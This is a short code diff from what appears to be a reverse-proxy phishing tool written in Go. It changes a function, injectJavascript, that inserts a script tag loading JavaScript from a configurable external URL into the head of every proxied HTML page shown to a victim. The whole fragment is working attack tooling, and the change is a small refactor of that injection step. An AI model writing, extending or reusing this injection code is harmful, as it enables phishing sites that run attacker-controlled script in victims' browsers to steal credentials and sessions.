@@ -116,11 +116,12 @@ func (p *phishingProxy) injectJavascript(response *http.Response) error {
 	}
 
 	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", p.JavascriptURL)
-	_ = document.
+	selection := document.
 		Find("head").
-		AppendHtml(payload)
+		AppendHtml(payload).
+		Parent()
 
-	html, err := document.Html()
+	html, err := selection.Html()
 	if err != nil {
 		return err
 	}
